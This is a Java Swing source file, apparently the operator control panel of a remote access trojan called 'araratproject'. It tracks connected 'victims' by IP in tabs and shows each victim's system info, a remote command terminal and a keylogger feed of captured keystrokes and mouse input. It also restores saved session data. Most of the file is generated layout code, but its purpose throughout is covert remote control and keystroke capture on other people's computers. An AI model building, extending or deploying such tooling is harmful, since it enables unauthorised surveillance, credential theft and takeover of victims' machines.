package araratproject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import javax.swing.JOptionPane;

/**
 * ControlFrame is the frame containing the Hosts tabs.
 *
 * @version 0.1
 * @author Andreas Demosthenous
 * @since 11/06/2020
 */
public class ControlFrame extends javax.swing.JFrame {

    private ArrayList<VictimTab> victimTabs;

    /**
     *
     */
    public ControlFrame() {

        initComponents();
        victimTabs = new ArrayList();
        victimTabbedPane.remove(victimTab);

    }

    /**
     * Adding a new tab for the victim
     *
     * @param victim
     */
    public boolean addVictim(Victim victim) {
        if (!exists(victim)) {
            VictimTab tab = new VictimTab(victim);
            tab.connect();
            victimTabs.add(tab);
            victimTabbedPane.addTab(victim.getPrivateIP(), tab);
            return true;

        } else if(Server.dataBase.getByVictim(victim) != null && Server.dataBase.getByVictim(victim).equals(victim.getSession())){
            VictimTab tab = victimTabs.get(getTabIndex(victim));
            tab.setVictim(victim);
            tab.connect();
            return true;
        }else{
            return false;
        }

    }

    /**
     * Adding a new tab for the victim with preexisting information.
     *
     * @param victim
     * @param info
     */
    public void addVictim(Victim victim, String info[]) {
        VictimTab tab = null;
        if (!exists(victim)) {
            tab = new VictimTab(victim);

            victimTabs.add(tab);
            victimTabbedPane.addTab(victim.getPrivateIP(), tab);
            tab.disconnect();
        } else {
            tab = victimTabs.get(getTabIndex(victim));
            tab.setVictim(victim);
            tab.disconnect();
        }
        if (info.length == 4) {
            tab.appendLogArea(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Loading Configuration...\n" + info[0]+
                    Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Configuration Loaded.\n");
            tab.appendSysInfoArea(info[1]);
            tab.appendTerminalArea(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Loading Configuration...\n" +info[2]+
                    Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Configuration Loaded.\n");
            tab.appendKeyLogArea(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Loading Configuration...\n" +info[3]+
                    Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Configuration Loaded.\n");

        }
    }

    /**
     * Setting the focus to the specified victim tab
     *
     * @param victim
     */
    public void focusVictim(Victim victim) {
        if (exists(victim) && victimTabs.get(getTabIndex(victim)) != null) {
            victimTabbedPane.setSelectedComponent(victimTabs.get(getTabIndex(victim)));
        }
    }

    /**
     * Setting victim tab as inactive
     *
     * @param victim
     */
    public void disconnectVictim(Victim victim) {
        if (exists(victim) && victimTabs.get(getTabIndex(victim)) != null) {
            victimTabs.get(getTabIndex(victim)).disconnect();
        }
    }

    /**
     * removing victim tab from tabbed pane
     *
     * @param victim
     */
    public void removeVictim(Victim victim) {
        if (exists(victim)) {
            victimTabbedPane.remove(getTabIndex(victim));
            victimTabs.remove(getTabIndex(victim));
        }
    }

    /**
     * returning the tab index of specified victim
     *
     * @param victim
     * @return
     */
    public int getTabIndex(Victim victim) {
        for (int i = 0; i < victimTabs.size(); i++) {
            if (victimTabs.get(i).getVictim().equals(victim)) {
                return i;
            }
        }
        return -1;
    }

    /**
     * returning the tab of the specified victim
     *
     * @param victim
     * @return
     */
    public VictimTab getTab(Victim victim) {
        for (int i = 0; i < victimTabs.size(); i++) {
            if (victimTabs.get(i).getVictim().equals(victim)) {
                return victimTabs.get(i);
            }
        }
        return null;
    }

    /**
     * returning whether the victim has a tab on the tabbed pane
     *
     * @param victim
     * @return
     */
    public boolean exists(Victim victim) {
        if (getTabIndex(victim) != -1) {
            return true;
        }
        return false;
    }


    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        victimTabbedPane = new javax.swing.JTabbedPane();
        victimTab = new javax.swing.JTabbedPane();
        infoPanel = new javax.swing.JPanel();
        SelectedHost = new javax.swing.JLabel();
        selectedLabel = new javax.swing.JLabel();
        InfoFrame = new javax.swing.JInternalFrame();
        PC_LogAreaScroller1 = new javax.swing.JScrollPane();
        sysInfoArea = new javax.swing.JTextArea();
        jSeparator1 = new javax.swing.JSeparator();
        logLabel = new javax.swing.JLabel();
        jScrollPane2 = new javax.swing.JScrollPane();
        logArea = new javax.swing.JTextArea();
        jScrollPane1 = new javax.swing.JScrollPane();
        infoArea = new javax.swing.JTextArea();
        statusLabel = new javax.swing.JLabel();
        TerminalPanel = new javax.swing.JPanel();
        PC_TerminalFrame = new javax.swing.JInternalFrame();
        PC_LogAreaScroller = new javax.swing.JScrollPane();
        terminalArea = new javax.swing.JTextArea();
        PC_CommandAreaScroller = new javax.swing.JScrollPane();
        terminalCommandArea = new javax.swing.JTextField();
        KeyLoggerPanel = new javax.swing.JPanel();
        KeyboardLogLabel = new javax.swing.JLabel();
        jScrollPane10 = new javax.swing.JScrollPane();
        keyLogArea = new javax.swing.JTextArea();
        keyboard = new javax.swing.JLabel();
        mouse = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.DO_NOTHING_ON_CLOSE);
        setTitle("Control Panel");
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        victimTabbedPane.setTabPlacement(javax.swing.JTabbedPane.RIGHT);
        victimTabbedPane.setToolTipText("");
        victimTabbedPane.setFont(new java.awt.Font("Arial", 1, 14)); // NOI18N

        victimTab.setBackground(new java.awt.Color(255, 255, 255));
        victimTab.setToolTipText("");
        victimTab.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        victimTab.setFont(new java.awt.Font("Arial", 1, 18)); // NOI18N

        infoPanel.setBackground(new java.awt.Color(255, 255, 255));

        SelectedHost.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        SelectedHost.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/tick.png"))); // NOI18N
        SelectedHost.setText("Selected Host:");

        selectedLabel.setBackground(new java.awt.Color(255, 255, 255));
        selectedLabel.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        selectedLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        selectedLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/PCEnabled.png"))); // NOI18N
        selectedLabel.setText("Unassigned");
        selectedLabel.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        selectedLabel.setDisabledIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/PCEnabled.png"))); // NOI18N
        selectedLabel.setEnabled(false);
        selectedLabel.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        selectedLabel.setMaximumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setMinimumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setName(""); // NOI18N
        selectedLabel.setOpaque(true);
        selectedLabel.setPreferredSize(new java.awt.Dimension(139, 128));
        selectedLabel.setRequestFocusEnabled(false);
        selectedLabel.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        selectedLabel.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, new java.awt.Color(102, 102, 102), new java.awt.Color(51, 51, 51), new java.awt.Color(0, 0, 0), new java.awt.Color(102, 102, 102)));

        InfoFrame.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        InfoFrame.setTitle("System Info");
        InfoFrame.setFrameIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/terminalIcon.png"))); // NOI18N
        InfoFrame.setMinimumSize(new java.awt.Dimension(0, 0));
        InfoFrame.setVisible(true);

        PC_LogAreaScroller1.setToolTipText("");
        PC_LogAreaScroller1.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        PC_LogAreaScroller1.setAutoscrolls(true);
        PC_LogAreaScroller1.setFont(new java.awt.Font("Sylfaen", 1, 24)); // NOI18N
        PC_LogAreaScroller1.setMinimumSize(new java.awt.Dimension(0, 0));

        sysInfoArea.setEditable(false);
        sysInfoArea.setBackground(new java.awt.Color(0, 0, 0));
        sysInfoArea.setColumns(20);
        sysInfoArea.setFont(new java.awt.Font("Monospaced", 0, 24)); // NOI18N
        sysInfoArea.setForeground(new java.awt.Color(255, 255, 255));
        sysInfoArea.setRows(5);
        sysInfoArea.setCaretColor(new java.awt.Color(255, 255, 255));
        sysInfoArea.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        sysInfoArea.setMinimumSize(new java.awt.Dimension(0, 0));
        sysInfoArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        PC_LogAreaScroller1.setViewportView(sysInfoArea);

        org.jdesktop.layout.GroupLayout InfoFrameLayout = new org.jdesktop.layout.GroupLayout(InfoFrame.getContentPane());
        InfoFrame.getContentPane().setLayout(InfoFrameLayout);
        InfoFrameLayout.setHorizontalGroup(
            InfoFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(org.jdesktop.layout.GroupLayout.TRAILING, PC_LogAreaScroller1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 1029, Short.MAX_VALUE)
        );
        InfoFrameLayout.setVerticalGroup(
            InfoFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(PC_LogAreaScroller1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        jSeparator1.setOrientation(javax.swing.SwingConstants.VERTICAL);

        logLabel.setFont(new java.awt.Font("Arial", 1, 20)); // NOI18N
        logLabel.setText("Log:");

        jScrollPane2.setInheritsPopupMenu(true);

        logArea.setEditable(false);
        logArea.setColumns(10);
        logArea.setFont(new java.awt.Font("Tahoma", 0, 20)); // NOI18N
        logArea.setRows(5);
        logArea.setAutoscrolls(false);
        logArea.setMinimumSize(new java.awt.Dimension(0, 0));
        jScrollPane2.setViewportView(logArea);

        jScrollPane1.setMaximumSize(new java.awt.Dimension(999999, 90));
        jScrollPane1.setPreferredSize(new java.awt.Dimension(183, 90));

        infoArea.setEditable(false);
        infoArea.setColumns(20);
        infoArea.setFont(new java.awt.Font("Monospaced", 0, 16)); // NOI18N
        infoArea.setRows(5);
        infoArea.setBorder(javax.swing.BorderFactory.createEmptyBorder(1, 1, 1, 1));
        infoArea.setMinimumSize(new java.awt.Dimension(0, 0));
        jScrollPane1.setViewportView(infoArea);

        statusLabel.setFont(new java.awt.Font("Arial", 1, 16)); // NOI18N
        statusLabel.setText("Active now");

        org.jdesktop.layout.GroupLayout infoPanelLayout = new org.jdesktop.layout.GroupLayout(infoPanel);
        infoPanel.setLayout(infoPanelLayout);
        infoPanelLayout.setHorizontalGroup(
            infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(infoPanelLayout.createSequentialGroup()
                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                    .add(org.jdesktop.layout.GroupLayout.TRAILING, infoPanelLayout.createSequentialGroup()
                        .add(11, 11, 11)
                        .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                            .add(org.jdesktop.layout.GroupLayout.TRAILING, infoPanelLayout.createSequentialGroup()
                                .add(1, 1, 1)
                                .add(jScrollPane2))
                            .add(org.jdesktop.layout.GroupLayout.TRAILING, jScrollPane1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .add(19, 19, 19))
                    .add(infoPanelLayout.createSequentialGroup()
                        .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                            .add(infoPanelLayout.createSequentialGroup()
                                .addContainerGap()
                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                    .add(logLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 314, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                    .add(statusLabel)))
                            .add(infoPanelLayout.createSequentialGroup()
                                .addContainerGap(org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                    .add(SelectedHost)
                                    .add(selectedLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 186, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
                                .add(0, 0, Short.MAX_VALUE)))
                        .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)))
                .add(jSeparator1, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 5, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                .add(10, 10, 10)
                .add(InfoFrame, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .add(10, 10, 10))
        );
        infoPanelLayout.setVerticalGroup(
            infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(infoPanelLayout.createSequentialGroup()
                .addContainerGap()
                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                    .add(InfoFrame, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .add(infoPanelLayout.createSequentialGroup()
                        .add(SelectedHost)
                        .add(2, 2, 2)
                        .add(selectedLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 139, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)
                        .add(statusLabel)
                        .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                        .add(jScrollPane1, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 169, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)
                        .add(logLabel)
                        .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                        .add(jScrollPane2, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 347, Short.MAX_VALUE)))
                .addContainerGap())
            .add(org.jdesktop.layout.GroupLayout.TRAILING, jSeparator1)
        );

        victimTab.addTab("Information", infoPanel);

        PC_TerminalFrame.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        PC_TerminalFrame.setIconifiable(true);
        PC_TerminalFrame.setResizable(true);
        PC_TerminalFrame.setTitle("Command Line");
        PC_TerminalFrame.setFrameIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/terminalIcon.png"))); // NOI18N
        PC_TerminalFrame.setVisible(true);

        PC_LogAreaScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        PC_LogAreaScroller.setToolTipText("");
        PC_LogAreaScroller.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        PC_LogAreaScroller.setAutoscrolls(true);
        PC_LogAreaScroller.setFont(new java.awt.Font("Sylfaen", 1, 24)); // NOI18N

        terminalArea.setEditable(false);
        terminalArea.setBackground(new java.awt.Color(0, 0, 0));
        terminalArea.setColumns(20);
        terminalArea.setFont(new java.awt.Font("Monospaced", 0, 24)); // NOI18N
        terminalArea.setForeground(new java.awt.Color(255, 255, 255));
        terminalArea.setRows(5);
        terminalArea.setCaretColor(new java.awt.Color(255, 255, 255));
        terminalArea.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        terminalArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        PC_LogAreaScroller.setViewportView(terminalArea);

        PC_CommandAreaScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        PC_CommandAreaScroller.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_NEVER);
        PC_CommandAreaScroller.setMaximumSize(new java.awt.Dimension(6, 23));
        PC_CommandAreaScroller.setMinimumSize(new java.awt.Dimension(6, 23));
        PC_CommandAreaScroller.setPreferredSize(new java.awt.Dimension(6, 23));

        terminalCommandArea.setBackground(new java.awt.Color(0, 0, 0));
        terminalCommandArea.setFont(new java.awt.Font("Monospaced", 0, 29)); // NOI18N
        terminalCommandArea.setForeground(new java.awt.Color(255, 255, 255));
        terminalCommandArea.setText(" PC_SAMPLE > ");
        terminalCommandArea.setToolTipText("");
        terminalCommandArea.setCaretColor(new java.awt.Color(255, 255, 255));
        terminalCommandArea.setMaximumSize(new java.awt.Dimension(126, 33));
        terminalCommandArea.setMinimumSize(new java.awt.Dimension(126, 33));
        terminalCommandArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        PC_CommandAreaScroller.setViewportView(terminalCommandArea);

        org.jdesktop.layout.GroupLayout PC_TerminalFrameLayout = new org.jdesktop.layout.GroupLayout(PC_TerminalFrame.getContentPane());
        PC_TerminalFrame.getContentPane().setLayout(PC_TerminalFrameLayout);
        PC_TerminalFrameLayout.setHorizontalGroup(
            PC_TerminalFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(PC_CommandAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .add(PC_LogAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 1387, Short.MAX_VALUE)
        );
        PC_TerminalFrameLayout.setVerticalGroup(
            PC_TerminalFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(PC_TerminalFrameLayout.createSequentialGroup()
                .add(PC_LogAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 711, Short.MAX_VALUE)
                .add(0, 0, 0)
                .add(PC_CommandAreaScroller, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 56, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
        );

        org.jdesktop.layout.GroupLayout TerminalPanelLayout = new org.jdesktop.layout.GroupLayout(TerminalPanel);
        TerminalPanel.setLayout(TerminalPanelLayout);
        TerminalPanelLayout.setHorizontalGroup(
            TerminalPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(PC_TerminalFrame)
        );
        TerminalPanelLayout.setVerticalGroup(
            TerminalPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(PC_TerminalFrame)
        );

        try {
            PC_TerminalFrame.setIcon(true);
        } catch (java.beans.PropertyVetoException e1) {
            e1.printStackTrace();
        }

        victimTab.addTab("Terminal", TerminalPanel);

        KeyLoggerPanel.setBackground(new java.awt.Color(255, 255, 255));

        KeyboardLogLabel.setFont(new java.awt.Font("Arial", 1, 18)); // NOI18N
        KeyboardLogLabel.setText("Log:");

        keyLogArea.setEditable(false);
        keyLogArea.setBackground(new java.awt.Color(236, 235, 235));
        keyLogArea.setColumns(20);
        keyLogArea.setFont(new java.awt.Font("Arial", 0, 20)); // NOI18N
        keyLogArea.setLineWrap(true);
        keyLogArea.setRows(5);
        jScrollPane10.setViewportView(keyLogArea);

        keyboard.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/KeyboardImages/75.jpg"))); // NOI18N

        mouse.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/KeyboardImages/0.png"))); // NOI18N

        org.jdesktop.layout.GroupLayout KeyLoggerPanelLayout = new org.jdesktop.layout.GroupLayout(KeyLoggerPanel);
        KeyLoggerPanel.setLayout(KeyLoggerPanelLayout);
        KeyLoggerPanelLayout.setHorizontalGroup(
            KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(KeyLoggerPanelLayout.createSequentialGroup()
                .addContainerGap()
                .add(KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                    .add(jScrollPane10)
                    .add(KeyLoggerPanelLayout.createSequentialGroup()
                        .add(KeyboardLogLabel)
                        .add(0, 0, Short.MAX_VALUE))
                    .add(KeyLoggerPanelLayout.createSequentialGroup()
                        .add(0, 308, Short.MAX_VALUE)
                        .add(keyboard)
                        .add(18, 18, 18)
                        .add(mouse)
                        .add(0, 292, Short.MAX_VALUE)))
                .addContainerGap())
        );
        KeyLoggerPanelLayout.setVerticalGroup(
            KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(KeyLoggerPanelLayout.createSequentialGroup()
                .add(KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.TRAILING)
                    .add(keyboard, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 285, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                    .add(mouse, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 296, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
                .add(2, 2, 2)
                .add(KeyboardLogLabel)
                .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                .add(jScrollPane10, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 459, Short.MAX_VALUE)
                .addContainerGap())
        );

        victimTab.addTab("Key logger", KeyLoggerPanel);

        victimTabbedPane.addTab("555.555.555.555", victimTab);

        org.jdesktop.layout.GroupLayout layout = new org.jdesktop.layout.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(victimTabbedPane)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
            .add(victimTabbedPane, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 837, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        setVisible(false);
    }//GEN-LAST:event_formWindowClosing

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JInternalFrame InfoFrame;
    private javax.swing.JPanel KeyLoggerPanel;
    private javax.swing.JLabel KeyboardLogLabel;
    private javax.swing.JScrollPane PC_CommandAreaScroller;
    private javax.swing.JScrollPane PC_LogAreaScroller;
    private javax.swing.JScrollPane PC_LogAreaScroller1;
    public static javax.swing.JInternalFrame PC_TerminalFrame;
    private javax.swing.JLabel SelectedHost;
    private javax.swing.JPanel TerminalPanel;
    private javax.swing.JTextArea infoArea;
    private javax.swing.JPanel infoPanel;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane10;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JSeparator jSeparator1;
    public static javax.swing.JTextArea keyLogArea;
    public static javax.swing.JLabel keyboard;
    public static javax.swing.JTextArea logArea;
    private javax.swing.JLabel logLabel;
    public static javax.swing.JLabel mouse;
    private javax.swing.JLabel selectedLabel;
    private javax.swing.JLabel statusLabel;
    private javax.swing.JTextArea sysInfoArea;
    public static javax.swing.JTextArea terminalArea;
    public javax.swing.JTextField terminalCommandArea;
    public static javax.swing.JTabbedPane victimTab;
    private javax.swing.JTabbedPane victimTabbedPane;
    // End of variables declaration//GEN-END:variables

}
